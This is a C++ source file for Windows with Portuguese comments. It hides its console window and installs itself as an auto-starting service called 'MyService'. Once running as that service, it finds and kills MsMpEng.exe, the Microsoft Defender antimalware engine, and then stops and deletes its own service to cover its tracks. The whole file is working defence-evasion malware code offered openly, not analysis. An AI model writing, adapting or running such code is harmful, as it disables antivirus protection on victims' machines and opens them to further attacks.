#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

// Função para encontrar e matar o processo MsMpEng.exe
void TerminateMsMpEngProcess() {
    // Obter um snapshot dos processos em execução
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cout << "Erro ao criar snapshot de processos: " << GetLastError() << std::endl;
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Percorrer os processos para encontrar o MsMpEng.exe
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"MsMpEng.exe") == 0) {
                // Encontrou o processo MsMpEng.exe, tenta terminá-lo
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess != NULL) {
                    if (TerminateProcess(hProcess, 0)) {
                        std::cout << "Processo MsMpEng.exe terminado com sucesso!" << std::endl;
                    }
                    else {
                        std::cout << "Erro ao terminar o processo MsMpEng.exe: " << GetLastError() << std::endl;
                    }
                    CloseHandle(hProcess);
                }
                else {
                    std::cout << "Erro ao abrir o processo MsMpEng.exe: " << GetLastError() << std::endl;
                }
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
}

// Função que será executada pelo serviço
void ServiceMain(DWORD argc, LPTSTR* argv) {
    // Aqui executa a função para matar o processo MsMpEng.exe.
    TerminateMsMpEngProcess();


// Desinstalar o serviço após a conclusão
SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
if (hSCManager != NULL) {
    SC_HANDLE hService = OpenService(hSCManager, L"MyService", SERVICE_STOP | DELETE);
    if (hService != NULL) {
        // Parar o serviço antes de excluí-lo
        SERVICE_STATUS status;
        ControlService(hService, SERVICE_CONTROL_STOP, &status);

        // Excluir o serviço
        if (DeleteService(hService)) {
            std::wcout << L"Serviço desinstalado com sucesso!" << std::endl;
        }
        else {
            std::wcout << L"Erro ao excluir o serviço: " << GetLastError() << std::endl;
        }

        CloseServiceHandle(hService);
    }
    else {
        std::wcout << L"Erro ao abrir o serviço para exclusão: " << GetLastError() << std::endl;
    }

    CloseServiceHandle(hSCManager);
}
else {
    std::wcout << L"Erro ao abrir o Service Control Manager para exclusão: " << GetLastError() << std::endl;
}
}


int main() {
    // Defina informações sobre o serviço
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { (LPWSTR)L"MyService", (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    // Abra o Service Control Manager
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager == NULL) {
        std::cout << "Erro ao abrir o Service Control Manager: " << GetLastError() << std::endl;
        return 1;
    }

    // Obtenha o caminho completo do executável atual
    wchar_t szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);

    // Verifique se o serviço já está instalado
    SC_HANDLE hService = OpenService(hSCManager, L"MyService", SERVICE_QUERY_CONFIG);
    if (hService == NULL) {
        // Se o serviço não estiver instalado, crie-o
        hService = CreateService(
            hSCManager,
            L"MyService",           // Nome do serviço
            L"My Service",          // Nome de exibição
            SERVICE_ALL_ACCESS,     // Permissões de acesso ao serviço
            SERVICE_WIN32_OWN_PROCESS, // Tipo de serviço
            SERVICE_AUTO_START,     // Tipo de inicialização (automática na inicialização)
            SERVICE_ERROR_NORMAL,   // Tipo de erro
            szPath,                 // Caminho do executável
            NULL,
            NULL,
            NULL,
            NULL,
            NULL
        );

        if (hService == NULL) {
            std::cout << "Erro ao criar o serviço: " << GetLastError() << std::endl;
            CloseServiceHandle(hSCManager);
            return 1;
        }

        std::cout << "Servico instalado com sucesso!" << std::endl;

        // Inicie o serviço manualmente após criá-lo
        if (!StartService(hService, 0, NULL)) {
            std::cout << "Erro ao iniciar o serviço: " << GetLastError() << std::endl;
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return 1;
        }

        std::cout << "Servico iniciado com sucesso!" << std::endl;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    // Inicie o serviço usando o Service Control Manager
    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        std::cout << "Erro ao iniciar o serviço: " << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}
